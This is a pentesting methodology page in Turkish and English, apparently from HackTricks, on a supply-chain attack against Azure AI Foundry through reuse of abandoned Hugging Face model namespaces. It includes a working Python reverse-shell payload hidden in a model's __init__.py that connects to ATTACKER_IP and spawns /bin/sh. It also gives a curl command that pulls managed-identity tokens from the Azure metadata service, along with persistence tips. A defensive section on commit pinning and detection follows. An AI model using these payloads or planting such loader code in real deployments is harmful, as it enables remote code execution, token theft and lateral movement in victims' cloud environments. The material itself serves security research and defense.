# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Senaryo

- Azure AI Foundry Model Catalog, tek tıkla dağıtım için birçok Hugging Face (HF) modelini içerir.
- HF model identifiers are Author/ModelName. Eğer bir HF author/org silinirse, herhangi biri o author'ı yeniden kaydettirip aynı ModelName ile legacy path'te bir model yayımlayabilir.
- Pipelines ve catalogs that pull by name only (no commit pinning/integrity) attacker-controlled repos'a çözümlenir. When Azure deploys the model, loader code endpoint environment'da çalışabilir ve o endpoint’in permissions'larıyla RCE sağlar.

Common HF takeover cases:
- Ownership deletion: Eski path takeover'a kadar 404 olur.
- Ownership transfer: Eski path 307 yeni author'a yönlendirilir while eski author var olduğu sürece. Eğer eski author daha sonra silinir ve yeniden kaydı yapılırsa, redirect bozulur ve attacker’s repo legacy path'te hizmet verir.

## Yeniden Kullanılabilir Namespace'leri Belirleme (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Azure AI Foundry'ye Karşı Uçtan Uca Saldırı Akışı

1) Model Catalog'ta, orijinal yazarı HF üzerinde silinmiş veya transfer edilmiş (eski yazar kaldırılmış) HF modellerini bulun.  
2) Terk edilmiş yazarı HF üzerinde yeniden kaydedin ve ModelName'i yeniden oluşturun.  
3) İçe aktarımda çalışan veya trust_remote_code=True gerektiren loader code içeren kötü amaçlı bir repo yayınlayın.  
4) Azure AI Foundry'dan legacy Author/ModelName'i dağıtın. Platform saldırganın reposunu çeker; loader, Azure endpoint container/VM içinde çalışır ve endpoint izinleriyle RCE sağlar.

İçe aktarım sırasında çalıştırılan örnek payload fragmanı (sadece gösterim amaçlı):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notlar
- AI Foundry dağıtımları HF ile entegre olduğunda genellikle modelin konfigürasyonunda referans verilen repo modüllerini (ör. auto_map) klonlayıp içe aktarır; bu kod çalıştırmayı tetikleyebilir. Bazı yollar için trust_remote_code=True gerekir.
- Erişim genellikle endpoint’in managed identity/service principal izinleriyle eşleşir. Bunu Azure içinde veri erişimi ve lateral movement için bir initial access foothold olarak değerlendirin.

## Post-Exploitation Tips (Azure Endpoint)

- Tokenlar için environment değişkenlerini ve MSI endpoint’lerini enumerate edin:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Edinilen token ile monte edilmiş depolamayı, model artifaktlarını ve erişilebilir Azure servislerini kontrol edin.
- Platform HF'den yeniden çekme yapıyorsa, zehirlenmiş model artifaktları bırakarak persistence'i değerlendirin.

## Azure AI Foundry Kullanıcıları için Savunma Rehberi

- HF'den yüklerken modelleri commit'e göre sabitleyin:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Doğrulanmış HF modellerini güvenilir bir iç registry'ye yansıtın ve oradan dağıtın.
- Kod tabanlarını ve defaults/docstrings/notebooks içinde hard-coded Author/ModelName'leri (silinmiş/transfer edilmiş olanları) sürekli tarayın; güncelleyin veya pinleyin.
- Dağıtımdan önce author varlığını ve model kökenini doğrulayın.

## Tanıma Heuristikleri (HTTP)

- Silinmiş author: author sayfası 404; legacy model yolu devralma olana kadar 404 döner.
- Transfer edilmiş model: legacy path 307 ile yeni author'a yönlendirilir, eski author var olduğu sürece; eğer eski author daha sonra silinir ve yeniden kayıt olursa, legacy path saldırgan içeriği sunar.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Çapraz Referanslar

- Daha geniş metodoloji ve tedarik zinciri notlarına bakın:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Kaynaklar

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
